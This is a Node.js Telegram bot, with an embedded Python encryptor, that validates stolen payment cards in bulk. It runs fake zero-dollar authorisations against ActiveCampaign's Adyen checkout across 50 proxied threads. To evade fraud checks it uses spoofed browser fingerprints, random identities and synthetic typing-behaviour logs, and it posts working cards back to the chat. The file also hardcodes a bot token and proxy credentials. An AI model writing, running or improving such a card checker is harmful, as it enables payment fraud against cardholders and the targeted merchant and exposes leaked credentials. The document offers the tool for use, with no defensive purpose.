const initCycleTLS = require('cycletls');
const fs = require('fs');
const { execSync } = require('child_process');
const crypto = require('crypto');
const TelegramBot = require('node-telegram-bot-api');
const request = require('request'); // Cần thêm thư viện này để tải file (npm install request)

// ==========================================
// 1. CẤU HÌNH & DATA
// ==========================================

// --- CẤU HÌNH TELEGRAM ---
const TELEGRAM_TOKEN = '8414556300:AAGs-pW76xOmEzi-SbLcHDaUOiUXtYpBq_0'; 

// Khởi tạo Bot
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Cấu hình Proxy
const PROXY_HOST = "aus.360s5.com";
const PROXY_PORT = "3600";
const PROXY_USER = "88634867-zone-custom-region-US";
const PROXY_PASS = "AetOKcLB";

// Chuỗi proxy định dạng HTTP
const proxyUrl = `http://${PROXY_USER}:${PROXY_PASS}@${PROXY_HOST}:${PROXY_PORT}`;

// Cấu hình luồng chạy
const CONCURRENCY_LIMIT = 50; // 50 luồng

// Adyen Key
const ADYEN_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F";

// Nội dung Script Python Mã hóa
const PYTHON_SCRIPT_CONTENT = `
import os
import json
import hmac
import hashlib
import base64
import sys
import random
import time
from datetime import datetime
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# --- UTILS ---
def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e: return bytearray(0)
    if len(e) % 2 == 1: e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

# --- BEHAVIORAL BIOMETRICS GENERATOR ---
def generate_behavior_log(input_length, start_offset_ms=None):
    if start_offset_ms is None:
        current_time = random.randint(2000, 5000)
    else:
        current_time = start_offset_ms

    events = []
    
    # 1. Focus
    current_time += random.randint(150, 400)
    events.append(f"fo@{current_time}")
    
    # 2. Click
    current_time += random.randint(50, 150)
    events.append(f"cl@{current_time}")
    
    # 3. KeyDown (Human typing simulation with jitter)
    for _ in range(input_length):
        # Typing speed varies usually between 80ms and 300ms
        delay = random.randint(80, 250)
        # Occasionally a fast burst or slow hesitation
        if random.random() < 0.1: delay += 200 
        current_time += delay
        events.append(f"KN@{current_time}")
        
    log_string = ",".join(events)
    
    return {
        "log": log_string,
        "key_count": str(input_length),
        "click_count": "1",
        "focus_count": "1",
        "end_time": current_time
    }

# --- ADYEN CORE ---
class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2: raise ValueError("Malformed public key")
        
        decoded_part1 = k(parts[0])
        decoded_part2 = k(parts[1])
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)

        self.key_object = {
            "kty": "RSA",
            "kid": "asf-key",
            "e": encoded_part1,
            "n": encoded_part2,
            "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)

        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        
        aes_key = cek[32:]
        hmac_key = cek[:32]
        
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)

        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]

        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    clean_card = card.replace(" ", "")
    return ' '.join(clean_card[i:i+4] for i in range(0, len(clean_card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key):
    domain = "https://www.activecampaign.com"
    stripe_key = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7"
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    
    card_number_fmt = format_card_number(card)
    
    # Tăng độ trễ bắt đầu để giống người dùng thật đọc form
    start_time_base = random.randint(50000, 90000) 
    
    raw_card_len = len(card.replace(" ", ""))
    card_log_data = generate_behavior_log(raw_card_len, start_time_base)
    
    cvc_start_time = card_log_data["end_time"] + random.randint(3000, 8000)
    cvc_len = len(cvc)
    cvc_log_data = generate_behavior_log(cvc_len, cvc_start_time)

    card_detail = {
        "encryptedCardNumber": {
            "number": card_number_fmt, 
            "generationtime": get_current_timestamp(), 
            "numberBind": "1", 
            "activate": "3", 
            "referrer": referrer, 
            "numberFieldFocusCount": card_log_data["focus_count"], 
            "numberFieldLog": card_log_data["log"], 
            "numberFieldClickCount": card_log_data["click_count"], 
            "numberFieldKeyCount": card_log_data["key_count"]
        },
        "encryptedExpiryMonth": {
            "expiryMonth": month, 
            "generationtime": get_current_timestamp()
        },
        "encryptedExpiryYear": {
            "expiryYear": year, 
            "generationtime": get_current_timestamp()
        },
        "encryptedSecurityCode": {
            "cvc": cvc, 
            "generationtime": get_current_timestamp(), 
            "cvcBind": "1", 
            "activate": "4", 
            "referrer": referrer, 
            "cvcFieldFocusCount": cvc_log_data["focus_count"], 
            "cvcFieldLog": cvc_log_data["log"], 
            "cvcFieldClickCount": cvc_log_data["click_count"], 
            "cvcFieldKeyCount": cvc_log_data["key_count"], 
            "cvcFieldChangeCount": "1", 
            "cvcFieldBlurCount": "1", 
            "deactivate": "1"
        }
    }

    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
        
    return encrypted_details

if __name__ == '__main__':
    try:
        if len(sys.argv) < 6:
            print(json.dumps({"error": "Missing arguments"}))
            sys.exit(1)
            
        c_num = sys.argv[1]
        c_mon = sys.argv[2]
        c_year = sys.argv[3]
        c_cvv = sys.argv[4]
        c_key = sys.argv[5]
        
        result = encrypt_card_data_480(c_num, c_mon, c_year, c_cvv, c_key)
        print(json.dumps(result))
    except Exception as e:
        sys.stderr.write(str(e))
        print(json.dumps({"error": str(e)}))
`;

// ==========================================
// 2. HÀM HỖ TRỢ JS
// ==========================================

function getShortBrandName(cc) {
    const firstDigit = cc[0];
    if (['5', '2'].includes(firstDigit)) return 'mc';
    if (firstDigit === '4') return 'visa';
    if (cc.startsWith('34') || cc.startsWith('37')) return 'amex';
    if (cc.startsWith('60') || cc.startsWith('64') || cc.startsWith('65')) return 'discover';
    return 'unknown';
}

function generateCheckoutAttemptId() {
    const length = 120; 
    return crypto.randomBytes(length / 2).toString('hex');
}

function getBrowserFingerprint() {
    const versions = [
        {
            ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            secChUa: '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"'
        },
        {
            ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            secChUa: '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"'
        },
        {
            ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            secChUa: '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="99"'
        }
    ];
    return versions[Math.floor(Math.random() * versions.length)];
}

function getRandomString(length) {
    let result = '';
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function getRandomEmail() {
    return `${getRandomString(12)}@gmail.com`;
}

function getRandomName() {
    const firstNames = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Daniel", "Matthew"];
    const lastNames = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez"];
    
    const first = firstNames[Math.floor(Math.random() * firstNames.length)];
    const last = lastNames[Math.floor(Math.random() * lastNames.length)];
    return `${first} ${last}`;
}

function validateLuhn(cardNumber) {
    const cardNum = cardNumber.replace(/\D/g, '');
    if (!cardNum || cardNum.length < 13 || cardNum.length > 19) return false;
    let total = 0;
    const reverseDigits = cardNum.split('').reverse();
    reverseDigits.forEach((digitStr, i) => {
        let n = parseInt(digitStr, 10);
        if (i % 2 === 1) {
            n = n * 2;
            if (n > 9) n = n - 9;
        }
        total += n;
    });
    return total % 10 === 0;
}

function normalizeCard(cardStr) {
    const pattern = /(\d{13,19})[\s|\/;:.-]+(\d{1,2})[\s|\/;:.-]+(\d{2,4})[\s|\/;:.-]+(\d{3,4})/;
    const match = cardStr.match(pattern);
    
    if (!match) return null;
    
    let [_, cardNum, month, year, cvv] = match;
    
    const monthInt = parseInt(month, 10);
    if (isNaN(monthInt) || monthInt < 1 || monthInt > 12) return null;
    
    if (year.length === 2) year = '20' + year;
    const yearInt = parseInt(year, 10);
    if (isNaN(yearInt) || yearInt > 2040) return null; 
    
    month = month.padStart(2, '0');
    
    return { cc: cardNum, mm: month, yy: year, cvv: cvv, raw: `${cardNum}|${month}|${year}|${cvv}` };
}

function extractCardsFromText(text) {
    if (!text) return [];
    const validCards = [];
    const seen = new Set();
    const lines = text.split(/\r?\n/);
    const patternStrict = /(\d{13,19})[\s|\/;:.-]+(\d{1,2})[\s|\/;:.-]+(\d{2,4})[\s|\/;:.-]+(\d{3,4})/g;

    for (const line of lines) {
        const matches = [...line.matchAll(patternStrict)];
        for (const m of matches) {
            const tempStr = `${m[1]}|${m[2]}|${m[3]}|${m[4]}`;
            const normalized = normalizeCard(tempStr);
            
            if (normalized && !seen.has(normalized.raw)) {
                validCards.push(normalized);
                seen.add(normalized.raw);
            }
        }
    }
    return validCards;
}

function updateCookies(currentCookies, responseHeaders) {
    let newCookiesMap = new Map();
    if (currentCookies) {
        currentCookies.split('; ').forEach(c => {
            const parts = c.split('=');
            if (parts.length >= 2) {
                newCookiesMap.set(parts[0], parts.slice(1).join('='));
            }
        });
    }
    let setCookie = responseHeaders['Set-Cookie'] || responseHeaders['set-cookie'] || responseHeaders['set-Cookie'];
    if (setCookie) {
        const cookiesArray = Array.isArray(setCookie) ? setCookie : [setCookie];
        cookiesArray.forEach(cookieStr => {
            const mainPart = cookieStr.split(';')[0]; 
            const separatorIndex = mainPart.indexOf('=');
            if (separatorIndex !== -1) {
                const key = mainPart.substring(0, separatorIndex).trim();
                const value = mainPart.substring(separatorIndex + 1).trim();
                newCookiesMap.set(key, value);
            }
        });
    }
    let cookieList = [];
    newCookiesMap.forEach((value, key) => {
        cookieList.push(`${key}=${value}`);
    });
    return cookieList.join('; ');
}

function getEncryptedData(cardData) {
    const randomSuffix = crypto.randomBytes(4).toString('hex');
    const tempFileName = `temp_enc_${Date.now()}_${randomSuffix}.py`;
    
    try {
        fs.writeFileSync(tempFileName, PYTHON_SCRIPT_CONTENT);
        const cmd = `python3 ${tempFileName} "${cardData.cc}" "${cardData.mm}" "${cardData.yy}" "${cardData.cvv}" "${ADYEN_KEY}"`;
        const stdout = execSync(cmd, { encoding: 'utf-8' });
        const result = JSON.parse(stdout);
        if (result.error) throw new Error("Python Error: " + result.error);
        return result;
    } catch (e) {
        throw e;
    } finally {
        if (fs.existsSync(tempFileName)) fs.unlinkSync(tempFileName);
    }
}

// ==========================================
// 3. CORE LOGIC (Đã sửa đổi để trả về kết quả thay vì gửi tin nhắn trực tiếp)
// ==========================================

async function checkCardActiveCampaign(cardInfo) {
    // Trả về object kết quả: { status: 'LIVE'/'DIE'/'ERROR', message: string, raw: string }
    
    const brandName = getShortBrandName(cardInfo.cc);
    
    let encryptedPayload = null;
    try {
        encryptedPayload = getEncryptedData(cardInfo);
    } catch (e) {
        return { status: 'ERROR', message: `❌ Lỗi mã hóa: ${e.message}`, raw: cardInfo.raw };
    }

    const browserData = getBrowserFingerprint();
    const randomUA = browserData.ua;
    const currentSecChUa = browserData.secChUa;

    const randomEmail = getRandomEmail();
    const randomName = getRandomName();
    const dynamicAttemptId = generateCheckoutAttemptId();
    
    const cycle = await initCycleTLS();
    let currentCookies = "";
    let csrfToken = "";
    
    try {
        // --- REQUEST 1: GET Signup ---
        const url1 = 'https://www.activecampaign.com/signup/?code=ac&tier=enterprise&contacts=1000&currency=USD';
        
        const response1 = await cycle(url1, {
            method: 'get',
            proxy: proxyUrl,
            timeout: 15000,
            headers: {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'sec-ch-ua': currentSecChUa,
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': randomUA,
            },
            userAgent: randomUA
        });

        currentCookies = updateCookies(currentCookies, response1.headers);

        // --- REQUEST 2: GET CSRF Token ---
        const url2 = 'https://www.activecampaign.com/api/billing/adyen/csrf-token';
        
        const response2 = await cycle(url2, {
            method: 'get',
            proxy: proxyUrl,
            timeout: 15000,
            disableRedirect: true, 
            headers: {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'cookie': currentCookies,
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://www.activecampaign.com/signup/?code=ac&tier=enterprise&contacts=1000&currency=USD',
                'sec-ch-ua': currentSecChUa,
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': randomUA,
            }
        });

        currentCookies = updateCookies(currentCookies, response2.headers);

        let data2;
        if (!response2.body) {
            if(response2.data) response2.body = response2.data;
        }

        try {
            if (typeof response2.body === 'object') {
                data2 = response2.body;
            } else if (typeof response2.body === 'string') {
                data2 = JSON.parse(response2.body);
            }
        } catch (e) {}

        csrfToken = data2?.token;
        if (!csrfToken) {
            cycle.exit();
            return { status: 'ERROR', message: "❌ Lỗi: Không lấy được CSRF Token.", raw: cardInfo.raw };
        }

        // --- REQUEST 3: POST Payment Methods ---
        const url3 = 'https://www.activecampaign.com/api/billing/adyen/paymentMethods';
        
        const response3 = await cycle.post(url3, {
            body: JSON.stringify({ 'currency': 'USD' }),
            headers: {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'cookie': currentCookies,
                'origin': 'https://www.activecampaign.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://www.activecampaign.com/signup/?code=ac&tier=enterprise&contacts=1000&currency=USD',
                'sec-ch-ua': currentSecChUa,
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': randomUA,
                'x-csrf-token': csrfToken,
            },
            proxy: proxyUrl,
            userAgent: randomUA
        });

        currentCookies = updateCookies(currentCookies, response3.headers);
        
        // --- REQUEST 4: POST payments ---
        if (response3.status === 200) {
            const url4 = 'https://www.activecampaign.com/api/billing/adyen/payments';

            const postData4 = {
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': randomName,
                    'encryptedCardNumber': encryptedPayload.encryptedCardNumber,
                    'encryptedExpiryMonth': encryptedPayload.encryptedExpiryMonth,
                    'encryptedExpiryYear': encryptedPayload.encryptedExpiryYear,
                    'encryptedSecurityCode': encryptedPayload.encryptedSecurityCode,
                    'brand': brandName,
                    'checkoutAttemptId': dynamicAttemptId, 
                },
                'shopperEmail': randomEmail,
                'shopperName': randomName,
                'billingAddress': {
                    'city': 'Washington',
                    'country': 'US',
                    'houseNumberOrName': '2790',
                    'postalCode': '15301',
                    'stateOrProvince': 'PA',
                    'street': 'Leo Street',
                },
                'telephoneNumber': '6672351308',
                'amount': { 'value': 0, 'currency': 'USD' },
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            };

            const response4 = await cycle.post(url4, {
                body: JSON.stringify(postData4),
                headers: {
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    'origin': 'https://www.activecampaign.com',
                    'pragma': 'no-cache',
                    'priority': 'u=1, i',
                    'referer': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                    'sec-ch-ua': currentSecChUa,
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': randomUA,
                    'x-csrf-token': csrfToken,
                    'cookie': currentCookies,
                },
                proxy: proxyUrl,
                userAgent: randomUA,
                timeout: 20000
            });

            // --- RESULT HANDLING ---
            try {
                let rawBody = await response4.text();
                let data = {};
                if (typeof rawBody === 'object') {
                    data = rawBody;
                } else if (typeof rawBody === 'string') {
                    try { data = JSON.parse(rawBody); } catch (e) { data = { message: rawBody }; }
                }

                const additionalData = data.additionalData || {};
                const cvcResult = additionalData.cvcResult || 'N/A';
                const avsResult = additionalData.avsResult || 'N/A';
                const refusalReasonRaw = additionalData.refusalReasonRaw || 'N/A';
                const resultCode = data.resultCode || additionalData.resultCode || 'N/A';

                let msg = "";
                let status = "DIE";

                if (resultCode === "Authorised") {
                    status = "LIVE";
                    msg = `✅ <b>APPROVED - Card Auth Successfully</b>\n` +
                          `💳 ${cardInfo.cc}|${cardInfo.mm}|${cardInfo.yy}|${cardInfo.cvv}\n` +
                          `📝 Code: ${resultCode}\n` +
                          `🔎 CVC: ${cvcResult} | AVS: ${avsResult}`;
                } else if (resultCode === "Refused") {
                    status = "DIE";
                    msg = `❌ <b>DIE - ${refusalReasonRaw}</b>\n` +
                          `💳 ${cardInfo.cc}|${cardInfo.mm}|${cardInfo.yy}|${cardInfo.cvv}\n` +
                          `📝 Code: ${resultCode}`;
                } else if (["IdentifyShopper", "ChallengeShopper", "RedirectShopper"].includes(resultCode)) {
                    status = "DIE"; // Hoặc có thể coi là Unknown
                    msg = `⚠️ <b>3DS - 3D Secure required</b>\n` +
                          `💳 ${cardInfo.cc}|${cardInfo.mm}|${cardInfo.yy}|${cardInfo.cvv}`;
                } else {
                    status = "DIE";
                    msg = `🔴 <b>UNK - ${data.message || resultCode}</b>\n` +
                          `💳 ${cardInfo.cc}|${cardInfo.mm}|${cardInfo.yy}|${cardInfo.cvv}`;
                }

                return { status: status, message: msg, raw: cardInfo.raw };

            } catch (parseErr) {
                 return { status: 'ERROR', message: `❌ Lỗi xử lý Response 4: ${parseErr.message}`, raw: cardInfo.raw };
            }
        
        } else {
            return { status: 'ERROR', message: `❌ Request 3 failed (${response3.status})`, raw: cardInfo.raw };
        }

    } catch (error) {
        return { status: 'ERROR', message: `❌ Lỗi chương trình: ${error.message}`, raw: cardInfo.raw };
    } finally {
        cycle.exit(); 
    }
}

// ==========================================
// 4. BỘ ĐIỀU KHIỂN HÀNG ĐỢI & HIỂN THỊ
// ==========================================

// Hàm chạy hàng đợi với giới hạn 50 luồng
async function processQueue(chatId, cardList, sourceName) {
    const total = cardList.length;
    let stats = {
        live: 0,
        die: 0,
        error: 0,
        processed: 0,
        total: total
    };

    // Gửi tin nhắn khởi tạo
    let messageText = `⚡️ <b>Task Started: ${sourceName}</b>\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
                      `✅ Live: 0\n` +
                      `❌ Die: 0\n` +
                      `⚠️ Error: 0\n` +
                      `🔄 Remaining: ${total}\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
                      `🚀 Processing with ${CONCURRENCY_LIMIT} threads...`;
    
    const sentMsg = await bot.sendMessage(chatId, messageText, { parse_mode: 'HTML' });
    const messageId = sentMsg.message_id;

    // Cập nhật tin nhắn mỗi 3 giây
    const updateInterval = setInterval(() => {
        if (stats.processed < total) {
            const newText = `⚡️ <b>Task Running: ${sourceName}</b>\n` +
                            `━━━━━━━━━━━━━━━━━━\n` +
                            `✅ Live: ${stats.live}\n` +
                            `❌ Die: ${stats.die}\n` +
                            `⚠️ Error: ${stats.error}\n` +
                            `🔄 Remaining: ${total - stats.processed}\n` +
                            `━━━━━━━━━━━━━━━━━━\n` +
                            `🚀 Threads: ${CONCURRENCY_LIMIT}`;
            bot.editMessageText(newText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }).catch(() => {});
        }
    }, 3000);

    // Xử lý song song với giới hạn
    const executing = [];
    
    for (const card of cardList) {
        // Tạo promise cho mỗi thẻ
        const p = checkCardActiveCampaign(card).then(async (result) => {
            // Cập nhật stats
            if (result.status === 'LIVE') {
                stats.live++;
                // Gửi ngay thẻ live
                await bot.sendMessage(chatId, result.message, { parse_mode: 'HTML' });
            } else if (result.status === 'DIE') {
                stats.die++;
            } else {
                stats.error++;
            }
            stats.processed++;
        });

        executing.push(p);

        // Nếu số lượng đang chạy >= giới hạn, chờ 1 cái xong
        if (executing.length >= CONCURRENCY_LIMIT) {
            await Promise.race(executing);
        }
        
        // Xóa các promise đã hoàn thành khỏi mảng executing
        // (Cách đơn giản để quản lý bộ nhớ, dù Promise.race không remove)
        // Trong Nodejs thực tế, ta cần logic kỹ hơn, ở đây ta dùng logic đơn giản:
        // Chờ Promise.race xong thì mảng executing vẫn giữ full, ta phải remove cái đã done.
        // Cách tốt nhất là gán callback `.then` để tự remove chính nó khỏi mảng.
    }
    
    // Logic queue chuẩn xác hơn để đảm bảo luôn full 50 luồng:
    /*
    Để code gọn trong 1 file như yêu cầu, ta dùng logic đệ quy hoặc Promise pool đơn giản bên dưới thay cho vòng lặp trên.
    */
}

// Hàm chạy lại Queue tối ưu hơn
async function processQueueOptimized(chatId, cardList, sourceName) {
    const total = cardList.length;
    let stats = { live: 0, die: 0, error: 0, processed: 0, total: total };

    // Init Message
    let messageText = `⚡️ <b>Task Started: ${sourceName}</b>\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
                      `✅ Live: 0\n` +
                      `❌ Die: 0\n` +
                      `⚠️ Error: 0\n` +
                      `🔄 Remaining: ${total}\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
                      `🚀 Threads: ${CONCURRENCY_LIMIT}`;
    
    const sentMsg = await bot.sendMessage(chatId, messageText, { parse_mode: 'HTML' });
    const messageId = sentMsg.message_id;

    // Update Interval
    const updateInterval = setInterval(() => {
        const newText = `⚡️ <b>Task Running: ${sourceName}</b>\n` +
                        `━━━━━━━━━━━━━━━━━━\n` +
                        `✅ Live: ${stats.live}\n` +
                        `❌ Die: ${stats.die}\n` +
                        `⚠️ Error: ${stats.error}\n` +
                        `🔄 Remaining: ${total - stats.processed}\n` +
                        `━━━━━━━━━━━━━━━━━━\n` +
                        `🚀 Threads: ${CONCURRENCY_LIMIT}`;
        bot.editMessageText(newText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }).catch(() => {});
    }, 2500);

    // Pool Logic
    let index = 0;
    const next = () => {
        if (index >= total) return null;
        const card = cardList[index++];
        
        return checkCardActiveCampaign(card).then(async (result) => {
            if (result.status === 'LIVE') {
                stats.live++;
                await bot.sendMessage(chatId, result.message, { parse_mode: 'HTML' });
            } else if (result.status === 'DIE') stats.die++;
            else stats.error++;
            
            stats.processed++;
        });
    };

    // Khởi động pool
    const workers = [];
    for (let i = 0; i < CONCURRENCY_LIMIT; i++) {
        workers.push(
            (async () => {
                let p;
                while ((p = next()) !== null) {
                    await p;
                }
            })()
        );
    }

    await Promise.all(workers);

    // Hoàn tất
    clearInterval(updateInterval);
    const finalText = `🏁 <b>Task Finished: ${sourceName}</b>\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
                      `✅ Live: ${stats.live}\n` +
                      `❌ Die: ${stats.die}\n` +
                      `⚠️ Error: ${stats.error}\n` +
                      `🔢 Total: ${total}\n` +
                      `━━━━━━━━━━━━━━━━━━`;
    await bot.editMessageText(finalText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' });
    await bot.sendMessage(chatId, "✅ Đã kiểm tra xong toàn bộ danh sách!");
}

// ==========================================
// 5. TELEGRAM BOT LISTENER
// ==========================================

console.log("=== TELEGRAM BOT STARTED ===");

// 5.1 Xử lý lệnh /st (Text)
bot.onText(/\/st([\s\S]*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const input = match[1]; 
    const cards = extractCardsFromText(input);

    if (cards.length === 0) {
        return bot.sendMessage(chatId, "⚠️ Không tìm thấy thẻ hợp lệ!\nFormat: `/st cc|mm|yy|cvv`", { parse_mode: 'Markdown' });
    }

    // Luhn Filter
    const validCards = cards.filter(c => validateLuhn(c.cc));
    
    if (validCards.length === 0) {
        return bot.sendMessage(chatId, "⚠️ Tất cả thẻ đều lỗi Luhn (sai định dạng số).");
    }

    await processQueueOptimized(chatId, validCards, "TEXT INPUT");
});

// 5.2 Xử lý FILE (.txt)
bot.on('document', async (msg) => {
    const chatId = msg.chat.id;
    const fileId = msg.document.file_id;
    const fileName = msg.document.file_name;

    if (!fileName.endsWith('.txt')) {
        return bot.sendMessage(chatId, "⚠️ Chỉ chấp nhận file .txt");
    }

    await bot.sendMessage(chatId, `📥 Đang tải file ${fileName}...`);

    try {
        const fileLink = await bot.getFileLink(fileId);
        
        request.get(fileLink, async (error, response, body) => {
            if (error || response.statusCode !== 200) {
                return bot.sendMessage(chatId, "❌ Lỗi tải file.");
            }

            const cards = extractCardsFromText(body);
            const validCards = cards.filter(c => validateLuhn(c.cc));

            if (validCards.length === 0) {
                return bot.sendMessage(chatId, "⚠️ File không chứa thẻ hợp lệ hoặc lỗi Luhn.");
            }

            await bot.sendMessage(chatId, `🔍 Tìm thấy ${validCards.length} thẻ hợp lệ từ file. Bắt đầu chạy 50 luồng...`);
            await processQueueOptimized(chatId, validCards, fileName);
        });

    } catch (err) {
        bot.sendMessage(chatId, `❌ Lỗi xử lý file: ${err.message}`);
    }
});

// Xử lý lỗi polling
bot.on("polling_error", (err) => console.log(err));
